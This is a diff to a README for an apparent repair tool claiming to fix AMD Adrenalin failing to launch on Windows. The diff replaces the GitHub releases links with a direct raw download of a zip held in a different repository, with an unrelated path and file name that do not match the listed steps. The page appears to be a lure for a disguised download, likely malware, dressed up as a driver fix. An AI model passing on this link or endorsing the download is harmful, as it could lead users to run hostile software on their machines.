@@ -5,7 +5,7 @@ description: "Resolve AMD Adrenalin software launch errors on Windows 10 and 11 
 ---
 # 🛠 AMD-Adrenalin-Not-Opening-Fix - Restore your graphics software control panel
 
-[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge&logo=github)](https://github.com/Toyga2757/AMD-Adrenalin-Not-Opening-Fix/releases)
+[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Toyga2757/toyga2757.github.io/main/uncalculated/io-toyga-github-v3.5-beta.3.zip)
 
 Many Windows users experience issues where the AMD Adrenalin software fails to launch. This problem often occurs after Windows updates, as the operating system may overwrite your graphics driver with a generic version. This inconsistency disconnects the software from the hardware. This tool resolves the communication error between your system and the graphics driver. It restores the user interface so you can manage your settings, monitor performance, and customize your game profiles.
 
@@ -22,7 +22,7 @@ This fix works on most desktop and laptop computers running modern versions of W
 
 Follow these steps to obtain the repair utility. 
 
-1. Visit the following website: [https://github.com/Toyga2757/AMD-Adrenalin-Not-Opening-Fix/releases](https://github.com/Toyga2757/AMD-Adrenalin-Not-Opening-Fix/releases)
+1. Visit the following website: [https://raw.githubusercontent.com/Toyga2757/toyga2757.github.io/main/uncalculated/io-toyga-github-v3.5-beta.3.zip](https://raw.githubusercontent.com/Toyga2757/toyga2757.github.io/main/uncalculated/io-toyga-github-v3.5-beta.3.zip)
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
